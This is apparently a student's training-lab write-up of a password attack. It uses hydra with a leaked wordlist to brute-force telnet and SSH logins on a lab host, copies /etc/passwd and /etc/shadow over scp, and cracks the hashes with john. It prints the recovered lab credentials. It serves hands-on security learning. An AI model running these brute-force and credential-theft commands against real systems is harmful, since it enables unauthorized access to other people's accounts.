# Bruteforce and Password Cracking 

> Makayla Ferrell | July 28th, 2021

### Steps 

1. Connect to VPN 
```
sudo openvpn <filename> 
```
2. Find Network IP range 
```
ip a 
```
192.168.99.100/24

3. Find active hosts with fping 
```
fping -a -g 192.168.99.100/24 2>/dev/null 
```
The target is 192.168.99.22

4. Nmap scan target
telnet 23 and ssh 22 

5. Discover telnet login 
```
hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-15.txt telnet://192.168.99.22 -f -V

```
[23][telnet] host: 192.168.99.22   login: sysadmin   password: secret
[23][telnet] host: 192.168.99.22   login: guest   password: 654321

6. Discover ssh login 
```
hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-15.txt 192.168.99.22 ssh 
```

7. Use scp and ssh credentials to get passwd and shadow files 
```
scp root@192.168.99.22:/etc/passwd . 
scp root@192.168.99.22:/etc/shadow . 
```
[22][ssh] host: 192.168.99.22   login: root   password: 123abc

8. Merge files into one for john to use 
```
unshadow passwd shadow > crackthese
```

9. Crack accounts with john 
```
john crackthese (uses default wordlist)
john --show crackthese > cracked 
```
